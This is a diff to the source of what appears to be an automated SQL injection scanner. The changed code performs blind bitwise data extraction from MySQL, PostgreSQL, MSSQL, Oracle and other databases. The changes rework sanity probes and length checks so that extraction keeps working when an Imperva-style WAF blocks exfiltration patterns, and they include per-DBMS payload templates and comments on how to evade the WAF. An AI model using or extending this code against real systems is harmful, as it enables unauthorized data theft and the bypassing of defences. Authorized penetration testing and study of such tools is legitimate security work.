@@ -59873,7 +59873,18 @@ class Scanner:
                     # because transient WAF blocks cause None-as-False bit misreads on different
                     # bits each run.  A second run that disagrees by > 20% signals oracle
                     # instability; we cap at max_len in that case rather than trusting either.
-                    if _length > 0 and (_length > max_len or _length > 200):
+                    # BUG-BITWISE-LENGTH-STABILITY-GE FIX: was `_length > max_len` which missed
+                    # the boundary case where _length == max_len (e.g. first run returns exactly
+                    # 257 when max_len=257). A single WAF-blocked high-order bit can cause the
+                    # bisection to land precisely AT max_len rather than above it — the stability
+                    # check never fired, so the next extraction run might produce a wildly
+                    # different length (257→546→68 observed in production log). Changed to >= so
+                    # _length == max_len also triggers the stability confirmation pass.
+                    # Additionally, a single bit-flip error near a power-of-two boundary (e.g.
+                    # true length 256 → blocked bit 8 → reads as 512, ratio=0.50) is caught by
+                    # the > 20% ratio check. Power-of-two lengths are inherently suspicious in
+                    # bitwise extraction (exactly 2^n could be a single bit stuck at 1).
+                    if _length > 0 and (_length >= max_len or _length > 200):
                         await asyncio.sleep(0.15)
                         _length2 = await _get_length_bitwise(query, max_bits=10)
                         if _length2 > 0:
@@ -60214,25 +60225,39 @@ class Scanner:
             # per char) but reliable when bitwise is WAF-selectively blocked.
             _bitwise_oracle_sane = True  # assume sane until proven otherwise
             if _use_bitwise_fallback and _boolean_oracle:
-                # Build DBMS-specific always-false bitwise condition using a constant expression
-                # (not a real query, so WAF content-inspection rules that target data-exfil
-                # patterns won't fire on this specific probe)
+                # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX v2 (CRITICAL): Use the ACTUAL
+                # extraction query in sanity probes instead of constant SQL expressions.
+                # Root cause: Imperva WAF (and similar) trigger on data-exfil patterns such as
+                # user()/database()/version() combined with bitwise operators. Constants like
+                # SELECT CAST(1 AS CHAR) do NOT trigger these rules, so the old sanity check
+                # passed through the WAF unmolested and returned a false "oracle is sane" result.
+                # Actual extraction queries (user(), database(), etc.) then triggered WAF \u2192
+                # returned 400 (True in this oracle) on every bit probe \u2192 all matching bits set \u2192
+                # garbage supplementary-plane chars like chr(0x88888) (observed in production log).
+                # Fix part 1 \u2014 broad block: use real query at pos=1 with always-false mask=0 probe.
+                #   x&0 is always 0; 0\u22601 is always SQL-false. If WAF blocks the probe because it
+                #   contains user()+bitwise \u2192 oracle returns True (400) \u2192 sanity fails \u2192 equality.
+                # Fix part 2 \u2014 selective block: Imperva also selectively blocks &mask=mask when
+                #   mask contains hex digit '8' (masks 8/0x8, 128/0x80, 2048/0x800, etc.), while
+                #   allowing &0=1 through (mask=0 not on blocklist). Secondary probe uses &8=1:
+                #   x&8 \u2208 {0,8}, never 1, so &8=1 is always SQL-false regardless of x. If WAF
+                #   blocks this specific mask pattern \u2192 oracle returns True \u2192 sanity fails.
                 _bw_san_ascii = {
-                    "MySQL": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
-                    "MariaDB": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
-                    "TiDB": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
-                    "PostgreSQL": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
-                    "CockroachDB": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
-                    "YugabyteDB": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
-                    "Amazon Redshift": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
-                    "MSSQL": "UNICODE(SUBSTRING((SELECT CAST(1 AS NVARCHAR(1))),1,1))",
-                    "Sybase": "UNICODE(SUBSTRING((SELECT CAST(1 AS VARCHAR(1))),1,1))",
-                    "Oracle": "ASCII(SUBSTR(TO_CHAR(1),1,1))",
-                    "SQLite": "UNICODE(SUBSTR(CAST(1 AS TEXT),1,1))",
-                    "Firebird": "ASCII_VAL(SUBSTRING(CAST('1' AS VARCHAR(1)) FROM 1 FOR 1))",
-                    "DB2": "ASCII(SUBSTR(CAST(1 AS VARCHAR(1)),1,1))",
-                    "ClickHouse": "ascii(toString(1))",
-                }.get(_dbms, "ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))")
+                    "MySQL": f"ORD(MID(({query}),1,1))",
+                    "MariaDB": f"ORD(MID(({query}),1,1))",
+                    "TiDB": f"ORD(MID(({query}),1,1))",
+                    "PostgreSQL": f"ASCII(SUBSTR(({query}),1,1))",
+                    "CockroachDB": f"ASCII(SUBSTR(({query}),1,1))",
+                    "YugabyteDB": f"ASCII(SUBSTR(({query}),1,1))",
+                    "Amazon Redshift": f"ASCII(SUBSTR(({query}),1,1))",
+                    "MSSQL": f"UNICODE(SUBSTRING(({query}),1,1))",
+                    "Sybase": f"UNICODE(SUBSTRING(({query}),1,1))",
+                    "Oracle": f"ASCII(SUBSTR(({query}),1,1))",
+                    "SQLite": f"UNICODE(SUBSTR(({query}),1,1))",
+                    "Firebird": f"ASCII_VAL(SUBSTRING(({query}) FROM 1 FOR 1))",
+                    "DB2": f"ASCII(SUBSTR(({query}),1,1))",
+                    "ClickHouse": f"ascii(substring(({query}),1,1))",
+                }.get(_dbms, f"ASCII(SUBSTRING(({query}),1,1))")
                 if _dbms == "Oracle":
                     _bw_san_cond = f"BITAND({_bw_san_ascii},0)=1"
                 elif _dbms == "Firebird":
@@ -60244,22 +60269,46 @@ class Scanner:
                 try:
                     _bw_san_r = await _cached_eval(_bw_san_cond)
                     if _bw_san_r is True:
-                        # Always-false returned True \u2192 oracle is corrupt for bitwise conditions.
-                        # The WAF blocks bitwise SQL patterns and returns True signal (e.g. status 400).
+                        # Always-false (x&0=1, x&0 is always 0) returned True \u2192
+                        # WAF blocks the real query+bitwise pattern and returns True signal (400).
                         # Bitwise extraction would produce garbage. Switch to equality scan.
                         LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED (always-false\u2192True). "
-                                    "WAF differentially blocks bitwise SQL conditions and returns True "
-                                    "signal. Switching to equality scan (_fallback_equality) which "
-                                    "uses only = operator \u2014 WAF-safe.", label)
+                                    "WAF differentially blocks bitwise SQL conditions containing real "
+                                    "query and returns True signal. Switching to equality scan "
+                                    "(_fallback_equality) which uses only = operator \u2014 WAF-safe.", label)
                         _bitwise_oracle_sane = False
-                    elif _bw_san_r is None:
-                        # Ambiguous: WAF may be blocking this specific sanity probe too.
-                        # Run one more probe with a different always-false form to confirm.
-                        _bw_san_cond2 = (f"{_bw_san_ascii}&0=0" if _dbms not in ("Oracle","Firebird","ClickHouse")
-                                         else _bw_san_cond)  # 0=0 is always TRUE \u2014 inverse check
+                    if _bitwise_oracle_sane:
+                        # Selective-mask sanity (Fix part 2): check if WAF blocks &8=mask pattern.
+                        # x&8 \u2208 {0,8}, never 1, so &8=1 is always SQL-false regardless of char value.
+                        if _dbms == "Oracle":
+                            _bw_san_cond_m8 = f"BITAND({_bw_san_ascii},8)=1"
+                        elif _dbms == "Firebird":
+                            _bw_san_cond_m8 = f"BIN_AND({_bw_san_ascii},8)=1"
+                        elif _dbms == "ClickHouse":
+                            _bw_san_cond_m8 = f"bitAnd({_bw_san_ascii},8)=1"
+                        else:
+                            _bw_san_cond_m8 = f"{_bw_san_ascii}&8=1"
+                        _bw_san_m8 = await _cached_eval(_bw_san_cond_m8)
+                        if _bw_san_m8 is True:
+                            LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED "
+                                        "(selective-mask: always-false &8=1\u2192True). WAF selectively "
+                                        "blocks bitmask probes containing hex digit '8' in mask value "
+                                        "(affected masks: 8, 128, 2048, 32768, 524288). "
+                                        "Switching to equality scan.", label)
+                            _bitwise_oracle_sane = False
+                    if _bitwise_oracle_sane and _bw_san_r is None:
+                        # PRIMARY probe ambiguous (blocked). Verify oracle health with always-true probe.
+                        if _dbms == "Oracle":
+                            _bw_san_cond2 = f"BITAND({_bw_san_ascii},0)=0"   # always True
+                        elif _dbms == "Firebird":
+                            _bw_san_cond2 = f"BIN_AND({_bw_san_ascii},0)=0"  # always True
+                        elif _dbms == "ClickHouse":
+                            _bw_san_cond2 = f"bitAnd({_bw_san_ascii},0)=0"   # always True
+                        else:
+                            _bw_san_cond2 = f"{_bw_san_ascii}&0=0"  # 0=0 is always True \u2014 inverse check
                         _bw_san_r2 = await _cached_eval(_bw_san_cond2)
                         if _bw_san_r2 is None:
-                            # Both sanity probes blocked \u2192 oracle unreliable for bitwise; use equality
+                            # Both probes blocked \u2192 oracle unreliable for bitwise; use equality
                             LOG.warning("[Inference] %s: BITWISE oracle sanity AMBIGUOUS (both sanity "
                                         "probes blocked). Falling back to equality scan.", label)
                             _bitwise_oracle_sane = False
@@ -108242,7 +108291,7 @@ class TechniqueCascadeEngine:
                                             # injection when the live FP guard correctly rejected it.
                                             LOG.debug(
                                                 "[PCV] det-notes Wasserstein=%.4f >= min=%.4f but below "
-                                                "strong threshold (>0.75) and no FP-preconf "
+                                                "strong threshold (>=0.80) and no FP-preconf "
                                                 "(preconf=%s conf=%.3f) — rejecting override; "
                                                 "moderate dist alone does not override live FP-guard rejection",
                                                 _det_wass_dist, _wn_min, _wn_fp_preconf, _wn_fp_conf)
